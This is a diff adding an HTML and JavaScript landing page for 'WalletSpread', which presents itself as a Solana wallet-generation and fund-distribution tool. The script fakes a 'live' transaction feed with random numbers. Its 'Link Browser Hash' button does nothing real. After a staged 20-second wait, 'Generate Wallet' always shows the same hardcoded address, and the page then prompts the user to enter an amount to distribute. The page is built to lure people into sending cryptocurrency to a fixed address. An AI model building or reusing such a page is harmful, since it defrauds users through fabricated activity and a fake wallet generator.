@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>WalletSpread — Demo</title>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#070607;
+      --panel:#1a0b1a;
+      --muted:#9aa3b2;
+      --accent1:#7b3cff;
+      --accent2:#5e1bd4;
+      --card:#1f0f23;
+      --glass: rgba(255,255,255,0.03);
+    }
+    html,body {
+      height:100%; margin:0;
+      font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+      background: radial-gradient(circle at 50% 100%, rgba(88,26,98,0.25) 0%, rgba(0,0,0,0) 30%), var(--bg);
+      color:#e6eef9;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
+    a { color: inherit; text-decoration: none; }
+    header { display:flex; justify-content:space-between; align-items:center; padding:20px 48px; font-size:13px; color:#9aa3b2; }
+    .btn-pill { background: linear-gradient(180deg,var(--accent1),var(--accent2)); color:white; padding:10px 18px; border-radius:999px; font-weight:600; box-shadow:0 6px 20px rgba(94,27,212,0.28); border:none; cursor:pointer; transition:opacity .3s ease; }
+    .container { max-width:1200px; margin:0 auto; width: calc(100% - 64px); }
+
+    .hero { display:flex; align-items:center; justify-content:space-between; gap:40px; padding:40px 0 80px 0; min-height:460px; }
+    .hero-left { max-width:560px; }
+    .brand { font-weight:900; font-size:64px; letter-spacing:-1px; display:inline-block; line-height:1; }
+    .brand .accent { color:var(--accent1); margin-left:6px; }
+    .lead { margin-top:18px; color:#a9b3c3; line-height:1.6; font-size:15px; max-width:42ch; }
+    .generate { margin-top:28px; display:inline-flex; align-items:center; gap:12px; }
+
+    .illus-wrap { display:flex; align-items:center; justify-content:center; flex:1; min-height:360px; }
+    .card-stack { width:260px; height:260px; filter:drop-shadow(0 20px 40px rgba(124,58,237,0.22)); transform: translateY(0); transition: transform .35s ease; }
+    .card-stack:hover { transform: translateY(-6px) rotate(-2deg); }
+
+    .recent { text-align:center; padding:40px 0 120px 0; }
+    .recent h2 { font-size:28px; margin:0 0 8px 0; font-weight:800; }
+    .recent p { margin:0 0 28px 0; color:#9aa3b2; }
+
+    .feed { max-width:720px; margin:0 auto; display:flex; flex-direction:column; gap:14px; }
+    .tx {
+      display:flex; align-items:center; justify-content:space-between;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border:1px solid rgba(255,255,255,0.03);
+      padding:16px 20px;
+      border-radius:12px;
+      backdrop-filter: blur(6px);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
+      font-size:14px;
+      color:#dbe8ff;
+    }
+    .tx-left { display:flex; align-items:center; gap:18px; min-width:0; }
+    .when { color:#9aa3b2; min-width:110px; font-size:13px; white-space:nowrap; }
+    .tx-middle { display:flex; align-items:center; gap:12px; min-width:0; }
+    .amount { font-weight:700; min-width:70px; text-align:right; }
+    .sol-badge { display:inline-flex; align-items:center; gap:8px; font-weight:700; color:#b6f0ff; }
+    .arrow { color:#9aa3b2; margin:0 8px; }
+    .gen { color:#c7a6ff; font-weight:600; white-space:nowrap; }
+    .duration { color:#9aa3b2; min-width:56px; text-align:right; font-size:13px; }
+
+    .wallet-section { display:none; max-width:720px; margin:40px auto; padding:0 20px; }
+    .wallet-header { background:linear-gradient(180deg,#7b3cff,#5e1bd4); padding:14px 20px; border-radius:10px 10px 0 0; font-weight:700; font-size:18px; }
+    .wallet-box { background:#1a0b1a; border:1px solid #3a1f4a; padding:20px; border-radius:0 0 10px 10px; }
+    .wallet-address { font-family:monospace; font-size:14px; background:#2a1933; padding:12px; border-radius:8px; word-break:break-all; margin-top:10px; }
+    .warning { background:#2a0f0f; border:1px solid #ff5e5e; color:#ffaeae; padding:12px 16px; border-radius:8px; margin-top:20px; font-size:13px; }
+
+    /* loader */
+    .loader { display:none; margin:40px auto; text-align:center; }
+    .spinner { border:4px solid rgba(255,255,255,0.2); border-top:4px solid var(--accent1); border-radius:50%; width:40px; height:40px; margin:0 auto 12px; animation: spin 1s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .loader p { color:#aaa; font-size:14px; }
+
+    @media (max-width:900px){
+      .hero { flex-direction:column; text-align:center; gap:28px; padding-top:8px; }
+      .hero-left { max-width:unset; }
+      .brand { font-size:44px; }
+      .card-stack { width:200px; height:200px; }
+      header { padding:14px 20px; }
+      .container { width: calc(100% - 40px); }
+    }
+
+    .tx.enter { animation: txIn .36s ease; }
+    @keyframes txIn { from { transform: translateY(-6px) scale(.99); opacity:0 } to { transform:none; opacity:1 } }
+
+    footer { height:60px; }
+
+    /* glow effect */
+    @keyframes glow {
+      0% { box-shadow: 0 0 0px rgba(123,60,255,0.0); }
+      50% { box-shadow: 0 0 20px rgba(123,60,255,0.8), 0 0 40px rgba(94,27,212,0.6); }
+      100% { box-shadow: 0 0 0px rgba(123,60,255,0.0); }
+    }
+    .btn-glow {
+      animation: glow 1.6s ease-in-out 2; /* pulse twice */
+    }
+
+    /* 🔹 Animated Background Squares */
+    .background {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: -1;
+      overflow: hidden;
+      pointer-events: none;
+    }
+    .square {
+      position: absolute;
+      width: 40vmin;
+      height: 40vmin;
+      border: 2px solid rgba(123,60,255,0.35);
+      animation: pulse 8s infinite ease-in-out;
+    }
+    .square:nth-child(2) {
+      width: 60vmin; height: 60vmin;
+      animation-delay: 2s;
+      border-color: rgba(94,27,212,0.3);
+    }
+    .square:nth-child(3) {
+      width: 80vmin; height: 80vmin;
+      animation-delay: 4s;
+      border-color: rgba(123,60,255,0.25);
+    }
+    .square:nth-child(4) {
+      width: 100vmin; height: 100vmin;
+      animation-delay: 6s;
+      border-color: rgba(94,27,212,0.2);
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(0.95) rotate(0deg); opacity:0.5; }
+      50% { transform: scale(1.1) rotate(180deg); opacity:1; }
+    }
+  </style>
+</head>
+<body>
+  <!-- 🔹 Background -->
+  <div class="background">
+    <div class="square"></div>
+    <div class="square"></div>
+    <div class="square"></div>
+    <div class="square"></div>
+  </div>
+
+  <header>
+    <div class="container" style="display:flex; align-items:center; justify-content:space-between;">
+      <div style="display:flex; gap:18px; align-items:center;">
+        <a href="#"></a>
+        <a href="#"></a>
+      </div>
+      <div>
+        <button id="linkBtn" class="btn-pill">Link Browser Hash</button>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <section class="hero">
+      <div class="hero-left">
+        <div style="display:flex; align-items:center; gap:12px;">
+          <h1 class="brand">Wallet<span class="accent">Spread</span></h1>
+        </div>
+        <p class="lead">
+          Your ultimate solution for organizing, bundling, and accessing professional fund distribution tools. Streamline your workflow with intelligent management.
+        </p>
+        <div class="generate">
+          <button id="generateBtn" class="btn-pill" style="display:inline-flex; align-items:center; gap:10px;">
+            Generate Wallet
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="opacity:.9"><path d="M5 12h14M13 5l7 7-7 7" stroke="rgba(255,255,255,0.92)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="illus-wrap" aria-hidden="true">
+        <svg class="card-stack" viewBox="0 0 200 200">
+          <defs>
+            <linearGradient id="g1" x1="0" x2="1" y1="0" y2="1">
+              <stop offset="0" stop-color="#9a5cff"/>
+              <stop offset="1" stop-color="#5e1bd4"/>
+            </linearGradient>
+            <filter id="glow" x="-50%" y="-50%" width="200%" height="200%">
+              <feGaussianBlur stdDeviation="8" result="blur"/>
+              <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+            </filter>
+          </defs>
+          <g transform="translate(30,40) rotate(-12)"><rect x="0" y="0" width="130" height="86" rx="8" fill="#4a1b66" opacity="0.85"/></g>
+          <g transform="translate(20,24) rotate(-6)"><rect x="0" y="0" width="140" height="92" rx="10" fill="#6f2ee6" opacity="0.92"/></g>
+          <g transform="translate(10,8)"><rect x="0" y="0" width="150" height="100" rx="14" fill="url(#g1)" filter="url(#glow)"/><rect x="62" y="36" rx="2" width="26" height="6" fill="rgba(255,255,255,0.95)"/><rect x="62" y="46" rx="2" width="26" height="6" fill="rgba(255,255,255,0.95)" opacity="0.6"/></g>
+          <g transform="translate(130,110)"><circle cx="18" cy="18" r="18" fill="#0b0710" stroke="rgba(255,255,255,0.06)"/><circle cx="18" cy="18" r="8" fill="#2f1233"/></g>
+        </svg>
+      </div>
+    </section>
+  </main>
+
+  <!-- Loader -->
+  <div class="loader" id="loader">
+    <div class="spinner"></div>
+    <p>Generating wallet, please wait...</p>
+  </div>
+
+  <!-- Wallet Generated Section -->
+  <div class="wallet-section" id="walletSection">
+    <div class="wallet-header">Wallet Generated</div>
+    <div class="wallet-box">
+      <p><strong>Generated Wallet Address:</strong></p>
+      <div class="wallet-address" id="walletAddress"></div>
+      <h4 style="margin-top:20px;">Next Step</h4>
+      <p>Enter the amount you want to spread across multiple wallets for optimal distribution.</p>
+    </div>
+    <div class="warning">
+      ⚠️ Important Warning <br>
+      Do not refresh the page or close the browser during the transaction process. This may result in loss of funds or incomplete distribution.
+    </div>
+  </div>
+
+  <section class="recent">
+    <div class="container" style="max-width:960px;">
+      <h2>Recent transactions</h2>
+      <p>Live wallet generation activity happening right now</p>
+      <div class="feed" id="feed"></div>
+    </div>
+  </section>
+
+  <footer></footer>
+
+  <script>
+    const feed = document.getElementById('feed');
+    const generateBtn = document.getElementById('generateBtn');
+    const linkBtn = document.getElementById('linkBtn');
+    const walletSection = document.getElementById('walletSection');
+    const walletAddress = document.getElementById('walletAddress');
+    const loader = document.getElementById('loader');
+    const fixedWallet = "6U4At8YfbHVV2isy6s9P1s93VnEAxVRniPnwAYruFXow";
+
+    // disable Generate Wallet by default
+    generateBtn.disabled = true;
+    generateBtn.style.opacity = "0.5";
+    generateBtn.style.cursor = "not-allowed";
+
+    // enable after clicking Link Browser Hash
+    linkBtn.addEventListener('click', () => {
+      generateBtn.disabled = false;
+      generateBtn.style.opacity = "1";
+      generateBtn.style.cursor = "pointer";
+      generateBtn.classList.add("btn-glow");
+      setTimeout(() => generateBtn.classList.remove("btn-glow"), 3200);
+
+      // disable linkBtn after use
+      linkBtn.disabled = true;
+      linkBtn.style.opacity = "0.5";
+      linkBtn.style.cursor = "not-allowed";
+    });
+
+    function randomTx() {
+      const when = Math.random() > 0.6 
+        ? 'a few seconds ago' 
+        : `${Math.floor(Math.random() * 59) + 1} seconds ago`;
+      const amount = (Math.random() * 4 + 1).toFixed(2);
+      const wallets = Math.floor(Math.random() * 6) + 9;
+      const duration = Math.floor(Math.random() * 16) + 8;
+      return { when, amount, wallets, duration };
+    }
+
+    const initial = Array.from({ length: 5 }, randomTx);
+    let txs = initial.slice();
+
+    function renderFeed() {
+      feed.innerHTML = '';
+      txs.forEach((t, idx) => {
+        const el = document.createElement('div');
+        el.className = 'tx' + (idx===0 ? ' enter' : '');
+        el.innerHTML = `
+          <div class="tx-left">
+            <div class="when">${escapeHtml(t.when)}</div>
+            <div class="tx-middle">
+              <div class="amount">${Number(t.amount).toFixed(2)}</div>
+              <div class="sol-badge">
+                <svg width="22" height="12" viewBox="0 0 24 12" fill="none"><path d="M2 6h20" stroke="#8ee2ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                <span style="opacity:.95">SOL</span>
+              </div>
+              <div class="arrow">→</div>
+              <div class="gen">generated ${t.wallets} wallets</div>
+            </div>
+          </div>
+          <div class="duration">${t.duration} sec</div>
+        `;
+        feed.appendChild(el);
+      });
+    }
+
+    function pushRandomTx() {
+      const when = Math.random() > 0.6 ? 'a few seconds ago' : `${Math.floor(Math.random()*59)+1} seconds ago`;
+
+      const amount = (Math.random()*4 + 1).toFixed(2);
+      const wallets = Math.floor(Math.random()*6) + 9;
+      const duration = Math.floor(Math.random()*16)+8;
+      const newTx = {when, amount, wallets, duration};
+      txs = [newTx, ...txs].slice(0,11);
+      renderFeed();
+    }
+
+    function escapeHtml(str){
+      return (''+str).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
+    }
+
+    renderFeed();
+    const interval = setInterval(pushRandomTx, 15000);
+
+    generateBtn.addEventListener('click', () => {
+      generateBtn.disabled = true;
+      generateBtn.style.opacity = "0.5";
+      generateBtn.style.cursor = "not-allowed";
+
+      const burst = Math.floor(Math.random()*3) + 2;
+      for(let i=0;i<burst;i++){ setTimeout(pushRandomTx, i*220); }
+
+      loader.style.display = "block";
+      walletSection.style.display = "none";
+
+      setTimeout(() => {
+        loader.style.display = "none";
+        walletAddress.textContent = fixedWallet;
+        walletSection.style.display = "block";
+        walletSection.scrollIntoView({ behavior: "smooth" });
+      }, 20000);
+    });
+
+    window.addEventListener('beforeunload', () => clearInterval(interval));
+  </script>
+</body>
+</html
